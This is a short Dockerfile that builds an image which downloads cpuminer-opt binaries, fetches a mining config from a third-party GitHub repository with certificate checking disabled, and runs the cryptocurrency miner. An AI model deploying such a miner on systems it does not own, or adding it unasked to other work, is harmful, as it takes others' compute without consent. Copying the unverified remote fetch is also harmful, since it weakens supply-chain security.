# Use an official Ubuntu runtime as a parent image
FROM ubuntu:20.04

# Set the working directory to /app
WORKDIR /app

# Install required dependencies
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Download pre-built cpuminer-opt binaries
RUN wget https://github.com/JayDDee/cpuminer-opt/releases/download/v3.16.1/cpuminer-opt-linux.tar.gz && \
    tar -xzvf cpuminer-opt-linux.tar.gz && \
    rm cpuminer-opt-linux.tar.gz

# Copy the configuration file from the provided URL
RUN wget https://raw.githubusercontent.com/rmaglite/blk/main/config.json --no-check-certificate -O config.json

# Set the entry point to run cpuminer-opt with the provided configuration file
ENTRYPOINT ["./cpuminer", "--config", "/app/config.json"]
